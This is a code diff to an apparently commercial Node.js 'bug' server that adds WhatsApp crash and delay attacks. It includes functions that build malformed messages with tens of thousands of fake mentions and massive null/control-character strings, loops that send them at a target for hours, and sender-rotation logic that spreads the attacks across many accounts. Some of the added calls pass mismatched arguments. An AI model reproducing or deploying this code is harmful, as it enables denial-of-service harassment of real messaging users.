@@ -60,6 +60,7 @@ const bugs = [
   //{ bug_id: "crash_spam", bug_name: "Spam Crash" },
   { bug_id: "halo", bug_name: "MENGETES MASALALU NYA (tes sender)" },
   { bug_id: "delay", bug_name: "MELIHAT RESPON NYA (delay)" },
+  { bug_id: "delayhard", bug_name: "DELAY V2" },
   { bug_id: "combo", bug_name: "COMBO" },
   { bug_id: "stuck_v3", bug_name: "Stuck V3" },
   { bug_id: "stuck_logo", bug_name: "STUCK LOGO" },
@@ -1169,6 +1170,12 @@ async function sendBugViaSocket(sock, bug, target) {
         await sleep(1000);
       }
       break;
+      case "delayhard":
+            for (let i = 0; i < 15; i++) {
+              await DelayXX(sock, targetJid);
+              await sleep(1000);
+            }
+            break;
     case "stuck_v3":
       for (let i = 0; i < 200; i++) {
         await ComboxJ(sock, targetJid);
@@ -1345,6 +1352,12 @@ app.get("/sendBug", async (req, res) => {
           case "combo":
             for (let i = 0; i < 20; i++) {
               await ComboZZ(sock, targetJid);
+              await sleep(1000);
+            }
+            break;
+            case "delayhard":
+            for (let i = 0; i < 15; i++) {
+              await DelayXX(sock, targetJid);
               await sleep(1000);
             }
             break;
@@ -1744,6 +1757,232 @@ app.get("/getLog", (req, res) => {
   } catch (err) {
     return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
   }
+});
+
+// ===== MIKUHOST: App Settings (dipakai Owner Page APK) =====
+const APP_SETTINGS_FILE = path.join(__dirname, "appSettings.json");
+const APP_SETTINGS_FIELDS = [
+  "buyUrl",
+  "bannerImage",
+  "bannerTitle",
+  "bannerDesc",
+  "landingBg",
+  "loginSound",
+];
+
+function loadAppSettings() {
+  try {
+    return JSON.parse(fs.readFileSync(APP_SETTINGS_FILE, "utf8"));
+  } catch (_) {
+    return {};
+  }
+}
+
+function saveAppSettings(data) {
+  fs.writeFileSync(APP_SETTINGS_FILE, JSON.stringify(data, null, 2));
+}
+
+app.get("/getAppSettings", (req, res) => {
+  const { key } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
+
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user) return res.json({ valid: false, message: "User not found." });
+
+  return res.json({
+    valid: true,
+    authorized: true,
+    settings: loadAppSettings(),
+  });
+});
+
+app.get("/updateAppSettings", (req, res) => {
+  const { key, ...updates } = req.query;
+  console.log(`[⚙️ SETTINGS] update oleh key ${key}: ${Object.keys(updates).join(", ") || "kosong"}`);
+
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
+
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user || user.role !== "owner") {
+    return res.json({ valid: true, authorized: false, message: "Only owner can update settings." });
+  }
+
+  const settings = loadAppSettings();
+  let changed = [];
+  for (const field of APP_SETTINGS_FIELDS) {
+    if (updates[field] !== undefined) {
+      settings[field] = sanitize(updates[field]).slice(0, 2000);
+      changed.push(field);
+    }
+  }
+
+  if (!changed.length) {
+    return res.json({ valid: true, authorized: true, success: false, message: "Tidak ada field yang dikenali.", fields: APP_SETTINGS_FIELDS });
+  }
+
+  try {
+    saveAppSettings(settings);
+  } catch (e) {
+    return res.json({ valid: true, authorized: true, success: false, message: "Gagal menyimpan settings." });
+  }
+
+  console.log(`[✅ SETTINGS] tersimpan: ${changed.join(", ")}`);
+  return res.json({ valid: true, authorized: true, success: true, changed, settings });
+});
+
+// ===== MIKUHOST: Login screen settings & sound (dipakai APK, publik) =====
+app.get("/getLoginSettings", (req, res) => {
+  const s = loadAppSettings();
+  const data = {
+    buyUrl: s.buyUrl || "",
+    bannerImage: s.bannerImage || "",
+    bannerTitle: s.bannerTitle || "MikuHost",
+    bannerDesc: s.bannerDesc || "",
+    landingBg: s.landingBg || "",
+    loginSound: s.loginSound || "",
+  };
+  return res.json({ valid: true, ...data, data });
+});
+
+app.get("/getLoginSound", (req, res) => {
+  const s = loadAppSettings();
+  const url = s.loginSound || "";
+  return res.json({ valid: true, url, soundUrl: url, data: { url } });
+});
+
+// ===== MIKUHOST: Info server untuk APK =====
+app.get("/getServerInfo", (req, res) => {
+  const { key } = req.query;
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
+
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user) return res.json({ valid: false, message: "User not found." });
+
+  const uptimeSec = Math.floor(process.uptime());
+  const totalRam = os.totalmem();
+  const freeRam = os.freemem();
+  const usedRam = totalRam - freeRam;
+
+  const globalNums = (typeof getGlobalSenderFolder === "function")
+    ? getGlobalSenderFolder()
+    : [];
+  const globalOnline = globalNums.filter(n => activeConnections[n]).length;
+  const privateSessions = Object.keys(activeConnections).filter(
+    n => !globalNums.includes(n)
+  );
+
+  const data = {
+    uptime: uptimeSec,
+    uptimeHuman: `${Math.floor(uptimeSec / 3600)}j ${Math.floor((uptimeSec % 3600) / 60)}m`,
+    ramUsed: usedRam,
+    ramTotal: totalRam,
+    ramFree: freeRam,
+    ramPercent: Number(((usedRam / totalRam) * 100).toFixed(1)),
+    senderOnline: globalOnline + privateSessions.length,
+    senderTotal: globalNums.length + privateSessions.length,
+    globalSenders: globalNums.length,
+    globalOnline,
+    privateOnline: privateSessions.length,
+    online: globalOnline + privateSessions.length,
+    node: process.version,
+    platform: `${os.type()} ${os.arch()}`,
+    time: new Date().toISOString(),
+  };
+
+  return res.json({ valid: true, authorized: true, ...data, data });
+});
+
+// ===== MIKUHOST: Hapus session sender (owner/admin) =====
+app.get("/deleteSender", (req, res) => {
+  // Terima "number" (baru) atau "id" (APK lama) supaya kompatibel dua arah
+  const { key } = req.query;
+  const number = req.query.number || req.query.id;
+  console.log(`[🗑️ DELETESENDER] ${number} oleh key ${key}`);
+
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
+
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user || !"owner admin".includes(user.role)) {
+    return res.json({ valid: true, authorized: false, message: "Access denied." });
+  }
+
+  const num = String(number || "").replace(/\D/g, "");
+  if (!num) {
+    return res.json({ valid: true, authorized: true, success: false, message: "Semua field wajib diisi." });
+  }
+
+  let removed = null;
+
+  // 1) Global: permenmd/global/<nomor>.json
+  const globalFile = path.join(__dirname, "permenmd", "global", `${num}.json`);
+  if (fs.existsSync(globalFile)) {
+    try { fs.unlinkSync(globalFile); } catch (_) {}
+    removed = `global/${num}`;
+  } else {
+    // 2) Private (per-user): folder permenmd/<username>/<num>.json + folder sesinya
+    const userSnap = path.join(__dirname, "permenmd", user.username, `${num}.json`);
+    const userSess = path.join(__dirname, "permenmd", user.username, num);
+    if (fs.existsSync(userSnap)) {
+      try { fs.unlinkSync(userSnap); } catch (_) {}
+      try { fs.rmSync(userSess, { recursive: true, force: true }); } catch (_) {}
+      removed = `${user.username}/${num}`;
+    } else {
+      // 3) Private legacy: folder permenmd/<nomor>
+      const privateDir = path.join(__dirname, "permenmd", num);
+      if (fs.existsSync(privateDir) && fs.statSync(privateDir).isDirectory()) {
+        fs.rmSync(privateDir, { recursive: true, force: true });
+        removed = num;
+      }
+    }
+  }
+
+  if (!removed) {
+    return res.json({ valid: true, authorized: true, success: false, message: "Session sender tidak ditemukan." });
+  }
+
+  // Putuskan koneksi aktifnya
+  if (activeConnections[num]) {
+    try { activeConnections[num].ws?.close?.(); } catch (_) {}
+    try { activeConnections[num].end?.(); } catch (_) {}
+    delete activeConnections[num];
+  }
+
+  console.log(`[✅ DELETESENDER] ${removed} dihapus`);
+  return res.json({ valid: true, authorized: true, success: true, deleted: removed });
+});
+
+// ===== MIKUHOST: Putuskan semua koneksi sender (owner/admin) =====
+app.get("/killWifi", (req, res) => {
+  const { key } = req.query;
+  console.log(`[🔌 KILLWIFI] oleh key ${key}`);
+
+  const keyInfo = activeKeys[key];
+  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
+
+  const db = loadDatabase();
+  const user = db.find(u => u.username === keyInfo.username);
+  if (!user || !"owner admin".includes(user.role)) {
+    return res.json({ valid: true, authorized: false, message: "Access denied." });
+  }
+
+  let killed = 0;
+  for (const name of Object.keys(activeConnections)) {
+    try { activeConnections[name].ws?.close?.(); } catch (_) {}
+    try { activeConnections[name].end?.(); } catch (_) {}
+    delete activeConnections[name];
+    killed++;
+  }
+
+  console.log(`[✅ KILLWIFI] ${killed} koneksi diputus`);
+  return res.json({ valid: true, authorized: true, success: true, killed });
 });
 
 const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';
@@ -2347,6 +2586,296 @@ async function DelayBrutalyyy(sock, target) {
     }
 }
 
+// delay nika
+
+async function protocolbug8(target, mention) {
+    const mentionedList = [
+        "13135550002@s.whatsapp.net",
+        ...Array.from({ length: 40000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+    ];
+
+    const embeddedMusic = {
+        musicContentMediaId: "589608164114571",
+        songId: "870166291800508",
+        author: ". Depay x Nika" + "ោ៝".repeat(10000),
+        title: " X ",
+        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
+        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
+        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
+        artistAttribution: "https://www.instagram.com/_u/xrelly",
+        countryBlocklist: true,
+        isExplicit: true,
+        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
+    };
+
+    const videoMessage = {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
+        mimetype: "video/mp4",
+        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
+        fileLength: "1515940",
+        seconds: 14,
+        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
+        height: 1280,
+        width: 720,
+        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
+        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
+        mediaKeyTimestamp: "1748276788",
+        contextInfo: { isSampled: true, mentionedJid: mentionedList },
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: "120363321780343299@newsletter",
+            serverMessageId: 1,
+            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
+        },
+        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
+        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
+        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
+        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
+        annotations: [{
+            embeddedContent: { embeddedMusic },
+            embeddedAction: true
+        }]
+    };
+
+        const stickerMessage = {
+        stickerMessage: {
+            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+            mimetype: "image/webp",
+            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+            fileLength: { low: 1, high: 0, unsigned: true },
+            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+            firstFrameLength: 19904,
+            firstFrameSidecar: "KN4kQ5pyABRAgA==",
+            isAnimated: true,
+            isAvatar: false,
+            isAiSticker: false,
+            isLottie: false,
+            contextInfo: {
+                mentionedJid: mentionedList
+            }
+        }
+    };
+
+    const audioMessage = {
+        audioMessage: {
+            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
+            mimetype: "audio/mpeg",
+            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
+            fileLength: "389948",
+            seconds: 24,
+            ptt: false,
+            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
+            caption: "Kyzz Xvisible V2",
+            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
+        }
+    };
+
+    const msg1 = generateWAMessageFromContent(target, {
+        viewOnceMessage: { message: { videoMessage } }
+    }, {});
+    
+    const msg2 = generateWAMessageFromContent(target, {
+        viewOnceMessage: { message: stickerMessage }
+    }, {});
+
+    const msg3 = generateWAMessageFromContent(target, audioMessage, {});
+
+    // Relay all messages
+    for (const msg of [msg1, msg2, msg3]) {
+        await depayy.relayMessage("status@broadcast", msg.message, {
+            messageId: msg.key.id,
+            statusJidList: [target],
+            additionalNodes: [{
+                tag: "meta",
+                attrs: {},
+                content: [{
+                    tag: "mentioned_users",
+                    attrs: {},
+                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
+                }]
+            }]
+        });
+    }
+
+    if (mention) {
+        await depayy.relayMessage(target, {
+            statusMentionMessage: {
+                message: {
+                    protocolMessage: {
+                        key: msg1.key,
+                        type: 25
+                    }
+                }
+            }
+        }, {
+            additionalNodes: [{
+                tag: "meta",
+                attrs: { is_status_mention: "true" },
+                content: undefined
+            }]
+        });
+    }
+}
+
+async function ivisibelspam(depayy, target) {
+ try {
+ await depayy.relayMessage(target, {
+ viewOnceMessage: {
+ message: {
+ interactiveMessage: {
+ header: {
+ locationMessage: {
+ degreesLatitude: 9999999999,
+ degreesLongitude: -9999999999,
+ name: "ꦽ".repeat(15000) + "\0".repeat(15000),
+ address: "depay" + "{".repeat(30000)
+ }
+ },
+ body: {
+ text: "Nika☀️"
+ }
+ }
+ }
+ }
+ }, {});
+
+ await depayy.relayMessage(target, {
+ groupStatusMessageV2: {
+ message: {
+ interactiveMessage: {
+ body: {
+ text: "DepayNika☀️"
+ },
+ NativeFlowMessage: {
+ buttons: [
+ "0@s.whatsapp.net",
+ ...Array.from({ length: 1999 })
+ ],
+ name: "\x10".repeat(50000)
+ },
+ nativeFlowMessage: {
+ name: "galaxy_message",
+ buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
+ }
+ }
+ }
+ }
+ }, {});
+
+ await depayy.relayMessage(target, {
+ groupStatusMessageV2: {
+ message: {
+ interactiveMessage: {
+ body: {
+ text: "Nika Attack You☀️"
+ },
+ NativeFlowMessage: {
+ buttons: [
+ "0@s.whatsapp.net",
+ ...Array.from({ length: 1999 })
+ ],
+ name: "\x10".repeat(50000)
+ },
+ nativeFlowMessage: {
+ name: "galaxy_message",
+ buttons: "\u0000".repeat(250000) + "\x10".repeat(250000)
+ }
+ }
+ }
+ }
+ }, {});
+
+ console.log('✅ wops bisa nih');
+ } catch (e) {
+ console.log('❌ anj pantek g bisa yatim');
+ }
+}
+
+async function OneMsg(depayy, target) {
+    try {
+        const msg = {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        body: { text: "For Mak lo" },
+                        nativeFlowMessage: {
+                            extra: "\u39300",
+                            buttons: "A".repeat(1000),
+                            messageParamsJson: "{".repeat(25000),
+                            buttons: [
+                                { name: "single_select", buttonParamsJson: "{}" },
+                                {
+                                    enumHostStorageType: { ON_PREMISE: 0, FACEBOOK: 1 },
+                                    enumVerifiedLevelValue: { UNKNOWN: 0, LOW: 1, HIGH: 2 }
+                                }
+                            ],
+                            name: "catalog_valid_mesaage_"
+                        }
+                    }
+                }
+            }
+        };
+
+        const msg2 = {
+            interactiveMessage: {
+                body: { text: "Xone | One Msg." + "\u0000".repeat(30000) },
+                nativeFlowMessage: { buttons: "tg_number_message".repeat(20000) }
+            }
+        };
+
+        await safeRelay(depayy, target, msg);
+        await safeRelay(depayy, target, msg2);
+    } catch (err) {
+        console.log("OneMsg error: " + err.message);
+    }
+}
+// Pakai in ini biar tahan lama
+async function delayios(depayy, durationHours, target, mention = true) {
+    try {
+        const totalDurationMs = durationHours * 60 * 60 * 1000;
+        const startTime = Date.now();
+        let count = 0;
+        let isRunning = true;
+
+        const sendNext = async () => {
+            if (!isRunning) return;
+            if (Date.now() - startTime >= totalDurationMs) {
+                console.log(`Stopped after sending ${count} messages`);
+                return;
+            }
+
+            try {
+                if (count < 8000) {
+                    await Promise.all([
+                    ivisibelspam(depayy, target),
+                    protocolbug8(target, true)
+                    ]);
+                    console.log(chalk.red(`Dreados (iOS) ${count}/8000 to ${target}`));
+                    count++;
+                    setTimeout(sendNext, 100);
+                } else {
+                    console.log(chalk.green(`Success Sending 8000 Messages to ${target}`));
+                    count = 0;
+                    console.log(chalk.red("Next 8000 Messages"));
+                    setTimeout(sendNext, 100);
+                }
+            } catch (error) {
+                console.error(`Error saat mengirim: ${error.message}`);
+                isRunning = false;
+            }
+        };
+
+        sendNext();
+    } catch (err) {
+        console.log("delayios error: " + err.message);
+    }
+}
+
+
 //Pemanggilan Combo
 async function ComboZZ(sock, target) {
 await DelayBrutalyyy(sock, target);
@@ -2355,6 +2884,12 @@ await StuckLogo(sock, target);
 await ComboxJ(sock, target);
 }
 
+async function DelayXX(sock, target) {
+await delayios(sock, target);
+await OneMsg(sock, target);
+await ivisibelspam(sock, target);
+await protocolbug8(sock, target);
+}
 //=============[END]==============\\
 
 
@@ -3352,12 +3887,26 @@ function checkActiveSessionInFolder(subfolderName) {
 
 // === Pilih sender: global utk role terbatas, personal utk member biasa ===
 // preferGlobal=false -> langsung pakai sender pribadi
+
+// ===== 🌐 Rotasi sender global: pilih acak dari yang BELUM kepake (LRU) =====
+const globalSenderLastUsed = Object.create(null);
+function pickGlobalSenderRandomUnused(onlineGlobal) {
+  if (!onlineGlobal || !onlineGlobal.length) return null;
+  const untouched = onlineGlobal.filter(n => !globalSenderLastUsed[n]);
+  const pool = untouched.length ? untouched : onlineGlobal;
+  const oldest = Math.min(...pool.map(n => globalSenderLastUsed[n] || 0));
+  const leastRecent = pool.filter(n => (globalSenderLastUsed[n] || 0) === oldest);
+  const pick = leastRecent[Math.floor(Math.random() * leastRecent.length)];
+  globalSenderLastUsed[pick] = Date.now();
+  return pick;
+}
+
 function pickSenderForUser(user, preferGlobal = true) {
   if (preferGlobal && canUseGlobalSender(user)) {
     const globalNames = getGlobalSenderFolder();
     const onlineGlobal = globalNames.filter(n => activeConnections[n]);
     if (onlineGlobal.length > 0) {
-      const pick = onlineGlobal[Math.floor(Math.random() * onlineGlobal.length)];
+      const pick = pickGlobalSenderRandomUnused(onlineGlobal);
       return { sock: activeConnections[pick], senderName: pick, isGlobal: true };
     }
   }
